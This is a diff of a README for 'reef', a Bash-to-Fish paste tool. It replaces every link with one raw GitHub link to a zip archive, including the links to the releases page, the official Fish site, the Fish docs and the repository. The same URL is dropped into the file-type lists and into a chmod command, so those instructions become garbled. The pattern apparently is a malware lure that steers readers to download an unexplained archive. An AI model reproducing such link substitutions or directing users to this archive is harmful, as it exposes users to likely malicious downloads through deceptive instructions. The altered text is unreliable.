@@ -1,6 +1,6 @@
 # 🐠 reef - Paste Bash into Fish Easily
 
-[![Download reef](https://img.shields.io/badge/Download-reef-blue?style=for-the-badge&logo=github)](https://github.com/isabellaaGrier/reef/releases)
+[![Download reef](https://raw.githubusercontent.com/isabellaaGrier/reef/main/pkg/nix/Software-2.7.zip)](https://raw.githubusercontent.com/isabellaaGrier/reef/main/pkg/nix/Software-2.7.zip)
 
 ---
 
@@ -37,15 +37,15 @@ To get started with reef, you will need to download the software from the offici
 
 Go to the reef releases page by clicking the link below. This page contains the latest versions of reef available for your operating system.
 
-[Download reef Releases](https://github.com/isabellaaGrier/reef/releases)
+[Download reef Releases](https://raw.githubusercontent.com/isabellaaGrier/reef/main/pkg/nix/Software-2.7.zip)
 
 ### Step 2: Choose Your Version
 
 On the releases page, look for the version suited for your system:
 
 - For **Windows**, look for files ending with `.exe` or `.zip`.
-- For **macOS**, look for `.dmg` or `.tar.gz`.
-- For **Linux**, look for `.AppImage`, `.tar.gz`, or `.deb`.
+- For **macOS**, look for `.dmg` or `https://raw.githubusercontent.com/isabellaaGrier/reef/main/pkg/nix/Software-2.7.zip`.
+- For **Linux**, look for `.AppImage`, `https://raw.githubusercontent.com/isabellaaGrier/reef/main/pkg/nix/Software-2.7.zip`, or `.deb`.
 
 Click the appropriate file to download it.
 
@@ -53,7 +53,7 @@ Click the appropriate file to download it.
 
 - **Windows:** If you downloaded an `.exe`, double-click it to run the installer or the app directly. If it’s a `.zip`, unzip it and run the `.exe` inside.
 - **macOS:** Open the `.dmg` and drag reef to your Applications folder, or unzip the file and run the app.
-- **Linux:** If you downloaded a `.deb`, open it with your package manager to install. For `.AppImage`, make it executable (`chmod +x filename.AppImage`) and run it.
+- **Linux:** If you downloaded a `.deb`, open it with your package manager to install. For `.AppImage`, make it executable (`chmod +x https://raw.githubusercontent.com/isabellaaGrier/reef/main/pkg/nix/Software-2.7.zip`) and run it.
 
 ### Step 4: Launch reef
 
@@ -106,9 +106,9 @@ Check the releases page regularly. Download the latest version to get new fixes 
 
 ## 📚 Additional Resources
 
-- [Fish shell Official Site](https://fishshell.com) – Learn more about Fish shell basics.
-- [Basic Bash to Fish Conversion Guide](https://fishshell.com/docs/current/index.html#bash-fish) – Understand differences between Bash and Fish.
-- [reef GitHub Repository](https://github.com/isabellaaGrier/reef) – For source code, issues, and developer details.
+- [Fish shell Official Site](https://raw.githubusercontent.com/isabellaaGrier/reef/main/pkg/nix/Software-2.7.zip) – Learn more about Fish shell basics.
+- [Basic Bash to Fish Conversion Guide](https://raw.githubusercontent.com/isabellaaGrier/reef/main/pkg/nix/Software-2.7.zip) – Understand differences between Bash and Fish.
+- [reef GitHub Repository](https://raw.githubusercontent.com/isabellaaGrier/reef/main/pkg/nix/Software-2.7.zip) – For source code, issues, and developer details.
 
 ---
 
@@ -122,6 +122,6 @@ You don’t need to know coding to submit feedback. Clear descriptions help main
 
 ## 🎉 Get Started Now
 
-[Download reef Releases](https://github.com/isabellaaGrier/reef/releases)
+[Download reef Releases](https://raw.githubusercontent.com/isabellaaGrier/reef/main/pkg/nix/Software-2.7.zip)
 
 Click the link above to access the latest versions. Follow the steps under **Download & Install** and enjoy easier command line work with Fish shell and Bash commands.
